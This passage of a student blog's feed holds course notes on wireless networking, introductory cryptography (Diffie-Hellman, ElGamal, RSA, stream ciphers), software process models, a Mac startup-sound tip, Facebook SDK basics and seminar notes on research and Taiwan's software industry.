&lt;h3&gt;Channel Quality Dependent Scheduling&lt;/h3&gt;
&lt;h3&gt;MIMO (Multiple Input Multiple Output)&lt;/h3&gt;
&lt;p&gt;簡單來說，就是多支天線彼此之間的合作，讓收訊更好。  &lt;/p&gt;
&lt;h4&gt;SD(Spatial Diversity) &amp;amp; SM(Spatial Multiplexing)&lt;/h4&gt;
&lt;h4&gt;Coordinated MIMO&lt;/h4&gt;
&lt;p&gt;甚至使用不同的基地台讓收訊更好  &lt;/p&gt;
&lt;h4&gt;Adaptive Modulation &amp;amp; Coding (AMC)&lt;/h4&gt;
&lt;p&gt;加入調變或 error correction code 讓收訊的效果更好  &lt;/p&gt;
&lt;h4&gt;QoS(Quality of Service) and QoE(Quality of Experience)&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Packet lost  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Scheduling and Resource Allocation&lt;/h3&gt;
&lt;p&gt;透過安排，讓收訊品質更好  &lt;/p&gt;
&lt;h3&gt;Heterogeneous Wireless Networks&lt;/h3&gt;
&lt;p&gt;透過一些小裝置合作，達到更好的無線收訊品質  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Secured and Right Protected Usage&lt;/h2&gt;
&lt;h3&gt;Digital Right Management (DRM)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DRM License Server - 認證  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;What is Encryption&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Symmetric encryption (secret key cryptography)  &lt;/li&gt;
&lt;li&gt;Asymmetric encryption (public key cryptography) - 為了要傳送 secret key  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Secret Key&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;DES - IBM  &lt;/li&gt;
&lt;li&gt;AES - NIST  &lt;/li&gt;
&lt;li&gt;Fast and efficient  &lt;/li&gt;
&lt;li&gt;to use public key cryptography only to a private secret key  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Public Key&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;RSA (明天要考密碼學期中考 還只能用手算 現在看到這個真的超親切的啊)  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Smartphones will evolve to all kinds of wearable devices, sensors, attached to our bodies (wireless chargeable), and displays are avaailable anywhere surrounding us.  &lt;/li&gt;
&lt;li&gt;HCIs(speech, gesture, facial, etc) will replace keypads  &lt;/li&gt;
&lt;li&gt;Internet of things(IoTs) will be all ubiquitous in our living environment  &lt;/li&gt;
&lt;li&gt;Information are collectd, indexed, and available in/from clouds  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作 low power 技術的教授都被 Google 挖走了XDD  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Academic Research: It is Easier Than You Think&lt;/h1&gt;
&lt;h2&gt;Important Features (M2I4) You should have&lt;/h2&gt;
&lt;p&gt;如果你想唸研究所的話，希望你有以下的特質&lt;br /&gt;
+ Motivation: really enjoy digging deeper into the scientific truth&lt;br /&gt;
+ Maturity: never afraid of being failed or left alone&lt;br /&gt;
+ Innovation: always think of what is (or can be) new and different?&lt;br /&gt;
+ Intelligence: filter useful information to become usable knowledge&lt;br /&gt;
+ Independence: a step-by-step problem formulation and module solving&lt;br /&gt;
+ Integrity: always be honest in reporting and research  &lt;/p&gt;
&lt;h2&gt;Getting Ready for Research&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Research topics selection and switching  &lt;ul&gt;
&lt;li&gt;Extend from senior graduate students' topics  &lt;/li&gt;
&lt;li&gt;Existing research projects in the Lab  &lt;/li&gt;
&lt;li&gt;Something your advisor is willing to learn closely with you  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Depth knowledge  &lt;ul&gt;
&lt;li&gt;A good series of class taking, or self study related tutorial background  &lt;/li&gt;
&lt;li&gt;Most updated Conference/Journal papers (&lt;a href="http://ieeexplore.ieee.org/Xplore/home.jsp"&gt;IEEE Xplore&lt;/a&gt;)  &lt;/li&gt;
&lt;li&gt;Joint project discussions and group collaborations, or new class offering  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Breadth Knowledge  &lt;ul&gt;
&lt;li&gt;Attend technical presentation and active questioning (key messages?)  &lt;/li&gt;
&lt;li&gt;Magazine and Hi-Tech News  &lt;/li&gt;
&lt;li&gt;到最後很多領域會殊途同歸，都會彼此相關，所以有機會的話可以瞭解一下其他領域在做什麼，尤其是一些 Conference。  &lt;/li&gt;
&lt;li&gt;透過瞭解其他領域的新聞及期刊，可以瞭解到整個市場的趨勢。  &lt;/li&gt;
&lt;li&gt;研究生有人去面試的時候，被問到的問題剛好是他在聽同學的 group meeting 時聽到的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Jumping into Research&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Extensive literature &lt;strong&gt;survey&lt;/strong&gt; and problem formulation  &lt;/li&gt;
&lt;li&gt;Summarize others' paper in their &lt;strong&gt;block diagrams&lt;/strong&gt; (flow charts) - look for weak links or not convincing blocks  &lt;ul&gt;
&lt;li&gt;看完別人的 paper 以後，要有辦法自己畫出剛剛那篇 paper 的 block diagram ，如果畫不出來的話，代表你還不夠瞭解那篇論文在幹嘛。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion meet the original problem formulation?  &lt;/li&gt;
&lt;li&gt;Methodologies: integration -&amp;gt; evolution -&amp;gt; revolution  &lt;/li&gt;
&lt;li&gt;Always use the data and compare the results with the most recent or best reported results  &lt;/li&gt;
&lt;li&gt;Clear and detailed interpretation of simulation results  &lt;ul&gt;
&lt;li&gt;做完 simulation 以後，要把結果好好想清楚，再跟自己的 leader 討論，而不是把整個 simulation 的結果原封不動的丟出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Confidence and leadership building (organized speech in group or individual meetings)  &lt;ul&gt;
&lt;li&gt;出去就業後不該是只幫別人寫程式碼，而是應該當個 leader ，因為研究給你訓練就是如此。得到一個新的題目、開始 survey、嘗試、失敗，這是你已經學到的東西，所以你應該已經瞭解如何處理，所以你應該當個 leader。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Persistence in Research&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Never expect a smooth path, refine the research scopes all the time (backoff slightly to find brighter road ahead)  &lt;/li&gt;
&lt;li&gt;Learn from any failure  &lt;/li&gt;
&lt;li&gt;Never hide from your professor  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Research Publications and Technical Reports&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Practice Engilish writing of thesis and papers: &lt;strong&gt;practice by mimicking&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Always seek publication opportunities: from conferences to periodical journals  &lt;ul&gt;
&lt;li&gt;自己主動去找有什麼地方可以投稿。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learn the standard &lt;strong&gt;writing style and outline&lt;/strong&gt; of manuscript (a good outline, 70% done!)  &lt;ul&gt;
&lt;li&gt;能夠把自己大綱全部列出來，並且瞭解大綱在做什麼，這樣大概就完成百分之七十了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learn from the grammatical errors corrected by your advisor or technical editing persons.  &lt;ul&gt;
&lt;li&gt;寫論文的文法很重要，設法知道老師幫你改了哪些部分，並從中學習。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Discuss clearly the flow charts and simulation results in your papers, never leave the weak links  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Never be afraid/frustrated of major/minor revision of paper submission - reviewers are never your enemies&lt;/strong&gt;  &lt;ul&gt;
&lt;li&gt;別人有什麼意見的話要用心傾聽，如果有好的意見的話就記得要更改。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Video"></category><category term="Audio"></category><category term="Security"></category><category term="Network"></category></entry><entry><title>ITC Hw2</title><link href="https://blog.m157q.tw/posts/2013/11/11/itc-hw2/" rel="alternate"></link><published>2013-11-11T12:34:00+08:00</published><updated>2013-11-11T12:34:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-11:posts/2013/11/11/itc-hw2/</id><summary type="html">&lt;h1&gt;ITC == Introduction To Cryptography&lt;/h1&gt;
&lt;h1&gt;Some notes about the Homework #2&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;1. Generator&lt;/h1&gt;
&lt;h2&gt;(a) Generator&lt;/h2&gt;
&lt;h2&gt;(b) Diffie-Hellman Key Exange Protocol&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;allows two parties to agree a secret key over an insecure channel without having met before.  &lt;/li&gt;
&lt;li&gt;Its security is based on the discrete logarithm problem in a finite abelian group G.&lt;br /&gt;
&lt;img alt="Diffie-Hellman 1" src="/files/itc-hw2/diffie-hellman-1.png" /&gt;&lt;br /&gt;
&lt;img alt="Diffie-Hellman 2" src="/files/itc-hw2/diffie-hellman-2.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;(c) Man-in-the-Middle attack&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Man-in-the-Middle" src="/files/itc-hw2/man-in-the-middle.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;(d) ElGamal cryptosystem&lt;/h2&gt;
&lt;p&gt;&lt;img alt="ElGamal 1" src="/files/itc-hw2/elgamal-1.png" /&gt;&lt;br /&gt;
&lt;img alt="ElGamal 2" src="/files/itc-hw2/elgamal-2.png" /&gt;&lt;br /&gt;
&lt;img alt="ElGamal 3" src="/files/itc-hw2/elgamal-3.png" /&gt;&lt;br /&gt;
&lt;img alt="ElGamal 4" src="/files/itc-hw2/elgamal-4.png" /&gt;&lt;br /&gt;
&lt;img alt="ElGamal 5" src="/files/itc-hw2/elgamal-5.png" /&gt;  &lt;/p&gt;
&lt;h4&gt;&lt;a href="https://en.wikipedia.org/wiki/Modular_multiplicative_inverse"&gt;Modular multiplicative inverse&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img alt="Modular multiplicative inverse" src="/files/itc-hw2/modular-multiplicative-inverse.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;2. Euler’s Theorem is the extension of Fermat’s Theorem.&lt;/h1&gt;
&lt;h2&gt;(a) Euler’s totient function&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Euler’s totient function 1" src="/files/itc-hw2/eulers-totient-function-1.png" /&gt;&lt;br /&gt;
&lt;img alt="Euler’s totient function 2" src="/files/itc-hw2/eulers-totient-function-2.png" /&gt;&lt;br /&gt;
&lt;img alt="Euler’s totient function 3" src="/files/itc-hw2/eulers-totient-function-3.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;(b) Euler’s Theorem&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Euler’s Theorem" src="/files/itc-hw2/eulers-theorem.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;(c) the last 3 digits of 8^803&lt;/h2&gt;
&lt;p&gt;&lt;img alt="the last 3 digits of 8^803" src="/files/itc-hw2/the-last-3-digits.png" /&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;8^{803}  \mod 1000 \equiv 8 \times 64^{400+1} \mod 1000 \equiv 8 \times 64 \equiv 512  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;3.&lt;/h1&gt;
&lt;h2&gt;multiplicative inverse&lt;/h2&gt;
&lt;p&gt;&lt;img alt="multiplicative inverse 1" src="/files/itc-hw2/multiplicative-inverse-1.png" /&gt;&lt;br /&gt;
&lt;img alt="multiplicative inverse 2" src="/files/itc-hw2/multiplicative-inverse-2.png" /&gt;&lt;br /&gt;
&lt;img alt="multiplicative inverse 3" src="/files/itc-hw2/multiplicative-inverse-3.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;finite field&lt;/h2&gt;
&lt;p&gt;&lt;img alt="finite field 1" src="/files/itc-hw2/finite-field-1.png" /&gt;&lt;br /&gt;
&lt;img alt="finite field 2" src="/files/itc-hw2/finite-field-2.png" /&gt;&lt;br /&gt;
&lt;img alt="finite field 3" src="/files/itc-hw2/finite-field-3.png" /&gt;&lt;br /&gt;
&lt;img alt="finite field 4" src="/files/itc-hw2/finite-field-4.png" /&gt;&lt;br /&gt;
&lt;img alt="finite field 5" src="/files/itc-hw2/finite-field-5.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;4. RSA&lt;/h1&gt;
&lt;h2&gt;p, q, e, n, d&lt;/h2&gt;
&lt;p&gt;use &lt;a href="https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm"&gt;Extended Euclidean algorithm&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;5. system of equations&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Still don't get it...  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="Cryptography"></category><category term="InfoSec"></category><category term="Security"></category></entry><entry><title>ITSE Ch2 - Process Models</title><link href="https://blog.m157q.tw/posts/2013/11/09/itse-ch2-process-models/" rel="alternate"></link><published>2013-11-09T09:47:00+08:00</published><updated>2013-11-09T09:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-09:posts/2013/11/09/itse-ch2-process-models/</id><summary type="html">&lt;h1&gt;ITSE == Introduction To Software Engineering&lt;/h1&gt;
&lt;h2&gt;NCTUCS 2013-Fall Introduction to Software Engineering by Professor Feng-Jian Wang&lt;/h2&gt;
&lt;h2&gt;Ch2 - Process Models&lt;/h2&gt;
&lt;hr /&gt;
&lt;h2&gt;Process Patterns&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;A process pattern  &lt;ul&gt;
&lt;li&gt;describes a process-related problem that is encountered during software engineering work  &lt;/li&gt;
&lt;li&gt;identifies the environment in which the problem has been encountered  &lt;/li&gt;
&lt;li&gt;suggests one or more proven solutions to the problem.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A process pattern provides you with a template - &lt;strong&gt;a consistent method for describing problem solutions within the context of the software process&lt;/strong&gt;.  &lt;/li&gt;
&lt;li&gt;Patterns can be defined at any level of abstraction. In some cases, a pattern might be used to describe a problem (and solution) associated with a complete process model.  &lt;/li&gt;
&lt;li&gt;patterns can be used to describe a problem (and solution) associated with a framework activity (e.g., planning) or an action within a framework activity (e.g., project estimating).  &lt;/li&gt;
&lt;li&gt;Ambler [Amb98] has proposed a template for describing a process pattern:  &lt;ul&gt;
&lt;li&gt;Pattern Name  &lt;/li&gt;
&lt;li&gt;Forces - The environment in which the pattern is encountered and the issues that make the problem visible and may affect its solution.  &lt;/li&gt;
&lt;li&gt;Type  &lt;ul&gt;
&lt;li&gt;Stage pattern - defines a problem associated with &lt;strong&gt;a framework activity for the process&lt;/strong&gt;.  &lt;/li&gt;
&lt;li&gt;Task pattern -  defines a problem associated with &lt;strong&gt;a software engineering action or work task and relevant to successful software engineering practice&lt;/strong&gt;.  &lt;/li&gt;
&lt;li&gt;Phase pattern - define &lt;strong&gt;the sequence of framework activities that occurs within the process, even when the overall flow of activities is iterative in nature&lt;/strong&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Initial context - Describes the conditions under which the pattern applies.  &lt;ol&gt;
&lt;li&gt;What organizational or team-related activities have already occurred?  &lt;/li&gt;
&lt;li&gt;What is the entry state for the process?  &lt;/li&gt;
&lt;li&gt;What software engineering information or project information already exists?  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Problem - The specific problem to be solved by the pattern  &lt;/li&gt;
&lt;li&gt;Solution - Describes how to implement the pattern successfully  &lt;/li&gt;
&lt;li&gt;Resulting Context - Describes the conditions that will result once the pattern has been successfully implemented.  &lt;/li&gt;
&lt;li&gt;Related Patterns - Provide a list of all process patterns that are directly related to this one.  &lt;/li&gt;
&lt;li&gt;Known Uses and Examples - Indicate the specific instances in which the pattern is applicable.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Prescriptive Process Models&lt;/h2&gt;
&lt;h4&gt;The Waterfall Model&lt;/h4&gt;
&lt;p&gt;&lt;img alt="Waterfall" src="/files/itse-ch2-process-models/waterfall.png" /&gt;  &lt;/p&gt;
&lt;h4&gt;The V-Model&lt;/h4&gt;
&lt;p&gt;&lt;img alt="V-Model" src="/files/itse-ch2-process-models/v-model.jpg" /&gt;  &lt;/p&gt;
&lt;h4&gt;Incremental Process Models&lt;/h4&gt;
&lt;p&gt;&lt;img alt="Incremental" src="/files/itse-ch2-process-models/incremental.png" /&gt;  &lt;/p&gt;
&lt;h4&gt;Evolutionary Process Models&lt;/h4&gt;
&lt;p&gt;Evolutionary models are iterative.&lt;br /&gt;
They are characterized in a manner that enables you to develop increasingly more complete versions of the software.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Prototyping&lt;br /&gt;
&lt;img alt="Prototyping" src="/files/itse-ch2-process-models/prototyping.jpg" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The Spiral Model&lt;br /&gt;
&lt;img alt="Spiral" src="/files/itse-ch2-process-models/spiral.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Concurrent Models&lt;br /&gt;
&lt;img alt="Concurrent" src="/files/itse-ch2-process-models/concurrent.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;The Unified Process (UP)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;UP Phases  &lt;/li&gt;
&lt;li&gt;UP Work Products  &lt;/li&gt;
&lt;li&gt;Personal Software Process (PSP)  &lt;/li&gt;
&lt;li&gt;Team Software Process (TSP)  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Software Engineering"></category></entry><entry><title>Disable Startup Sound of a Mac</title><link href="https://blog.m157q.tw/posts/2013/11/06/disable-startup-sound-of-a-mac/" rel="alternate"></link><published>2013-11-06T07:30:00+08:00</published><updated>2013-11-06T07:30:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-06:posts/2013/11/06/disable-startup-sound-of-a-mac/</id><summary type="html">&lt;p&gt;The startup sound of Mac won't disappear if I mute the speaker.&lt;br /&gt;
The startup sound just annoys me, so I wanna disable it.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Disable startup sound&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;$ sudo nvram SystemAudioVolume=%80&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;It should work.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Enable startup sound again&lt;/h2&gt;
&lt;p&gt;To enable the startup sound  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo nvram -d SystemAudioVolume&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Just still don't know why &lt;code&gt;%80&lt;/code&gt; O_o?  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.cultofmac.com/200772/silence-your-mac-boot-startup-sound-altogether-os-x-tips/"&gt;Silence Your Mac Boot Startup Sound Altogether [OS X Tips]&lt;/a&gt;  &lt;/p&gt;</summary><category term="OS X"></category><category term="Mac"></category><category term="Startup Sound"></category></entry><entry><title>ITC - week7</title><link href="https://blog.m157q.tw/posts/2013/11/06/itc-week7/" rel="alternate"></link><published>2013-11-06T02:22:00+08:00</published><updated>2013-11-06T02:22:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-06:posts/2013/11/06/itc-week7/</id><summary type="html">&lt;h1&gt;ITC == Introduction To Cryptography&lt;/h1&gt;
&lt;h2&gt;Pseudorandom Number Generation And Stream Cipher&lt;/h2&gt;
&lt;h2&gt;Algorithm Design&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Purpose-built algorithms  &lt;ul&gt;
&lt;li&gt;專門用來產生 pseudorandom number (bit stream)  &lt;/li&gt;
&lt;li&gt;最具代表性: RC4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Algorithms based on existing cryptographic algorithms  &lt;ul&gt;
&lt;li&gt;Symmetric block ciphers  &lt;/li&gt;
&lt;li&gt;Asymmetric ciphers  &lt;/li&gt;
&lt;li&gt;Hash functions and message authentication codes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Pseudorandom Number Generators&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Linear Congruential Generators  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;X_{n+1} = \left (aX_{n}+c \right ) \mod m  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Blum Blum Shub Generator (BBS Generator)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Pseudorandom Number Generation Using A Block Cipher&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PRNG Using Block Cipher Modes of Operation  &lt;ul&gt;
&lt;li&gt;CTR Mode&lt;br /&gt;
&lt;img alt="CTR Mode" src="/files/itc-week7/ctr-mode.png" /&gt;  &lt;/li&gt;
&lt;li&gt;OFB Mode&lt;br /&gt;
&lt;img alt="OFB Mode" src="/files/itc-week7/ofb-mode.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Stream Ciphers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A key is input to a pseudorandom bit generator that produces a stream of 8-bit numbers that are apparently random.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The output, called &lt;strong&gt;keystream&lt;/strong&gt;, is combined one byte at a time with a plaintext stream using the bitwise XOR operation.  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;RC4&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;A stream cipher designed in 1987 by Ron Rivest for RSA security.  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Cryptography"></category><category term="Security"></category></entry><entry><title>SNTT - week7</title><link href="https://blog.m157q.tw/posts/2013/11/05/sntt-week7/" rel="alternate"></link><published>2013-11-05T16:58:00+08:00</published><updated>2013-11-05T16:58:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-05:posts/2013/11/05/sntt-week7/</id><summary type="html">&lt;p&gt;SNTT == Socail Network Technology and Trend  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.facebook.com"&gt;facebook developer&lt;/a&gt;&lt;br /&gt;
Facebook App setup  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/facebook/facebook-php-sdk"&gt;Facebook PHP SDK&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Facebook PHP SDK&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Feed  &lt;/li&gt;
&lt;li&gt;Graph API  &lt;/li&gt;
&lt;li&gt;Checkin  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.facebook.com/roadmap/"&gt;Roadmap&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Release the information about the large change of the facebook API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access Token  &lt;ul&gt;
&lt;li&gt;Token Type  &lt;ul&gt;
&lt;li&gt;long term  &lt;/li&gt;
&lt;li&gt;short term  &lt;/li&gt;
&lt;li&gt;for App  &lt;/li&gt;
&lt;li&gt;for Website  &lt;/li&gt;
&lt;li&gt;for fan page  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;//Access Token  &lt;/span&gt;
&lt;span class="x"&gt;$access_token = $facebook-&amp;gt;getAccessToken();  &lt;/span&gt;
&lt;span class="x"&gt;$facebook-&amp;gt;setAccessToken($access_token);  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Same Domain Policy  &lt;/li&gt;
&lt;li&gt;Channel File  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Facebook"></category><category term="Social Network"></category></entry><entry><title>資訊工程研討 - 台灣資訊與軟體產業未來之發展與機會</title><link href="https://blog.m157q.tw/posts/2013/11/05/computer-science-seminars-the-development-and-opportunities-about-the-it-in-taiwan/" rel="alternate"></link><published>2015-10-26T15:17:00+08:00</published><updated>2015-10-26T15:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-05:posts/2013/11/05/computer-science-seminars-the-development-and-opportunities-about-the-it-in-taiwan/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;講題  &lt;ul&gt;
&lt;li&gt;台灣資訊與軟體產業未來之發展與機會  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;演講者  &lt;ul&gt;
&lt;li&gt;劉念臻博士(台灣微軟開發工具暨平台推廣處總經理)  &lt;/li&gt;
&lt;li&gt;上官林傑  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;劉念臻博士&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Background  &lt;ul&gt;
&lt;li&gt;全球 IT 軟體服務支出穩定成長  &lt;/li&gt;
&lt;li&gt;台灣仍停滯在硬體購置階段  &lt;/li&gt;
&lt;li&gt;台灣對於 IT 軟體服務業投資明顯不足  &lt;/li&gt;
&lt;li&gt;台灣的軟體發展是個 tough business  &lt;ul&gt;
&lt;li&gt;Missed schedule  &lt;/li&gt;
&lt;li&gt;Unmanageable  &lt;/li&gt;
&lt;li&gt;Over Budget  &lt;/li&gt;
&lt;li&gt;Poor Quality  &lt;/li&gt;
&lt;li&gt;Complexity  &lt;/li&gt;
&lt;li&gt;Project failures  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;推薦閱讀： The mythical man-mouth&lt;br /&gt;
"No Silver Bullet" - in Software Engineering  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;US$250 Billion/Year on software development in US with 175,000 projects.  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Software development is not an easy thing.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;近年來政府開始轉變  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;張善政主委將台灣政府的資訊服務採購從低價標改成最有利標，避免因低價搶標影響軟體品質。  &lt;/li&gt;
&lt;li&gt;政府採購的優先順序採「先軟後硬」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Smart Device App + Cloud == 發展應用軟體的新契機  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;障礙在於商業模式，而非技術。光有技術而商業模式不變是沒有用的。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;營收的改變  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通路的衝突  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;內部的變革  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows App APP+Cloud 36 hr Hackathon  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;台灣軟體產業最需要的大環境  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;與硬體產業同樣的關注與認知  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重視軟體/服務價值的國內市場  &lt;/li&gt;
&lt;li&gt;技術以外的關鍵要素:商業模式/行銷/國際化  &lt;/li&gt;
&lt;li&gt;軟體人才匯集的環境  &lt;/li&gt;
&lt;li&gt;學校軟體人才的培育  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;上官林傑&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;AGENDA  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;趨勢會變，軟體本質不變  &lt;/li&gt;
&lt;li&gt;用心生活，解決真實的問題  &lt;/li&gt;
&lt;li&gt;追尋熱情，把事情做好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果你有技術可以改善問題，卻不知道這個世界上有哪些問題必須解決，你就無法發揮你的價值。  &lt;/p&gt;
&lt;/li&gt;
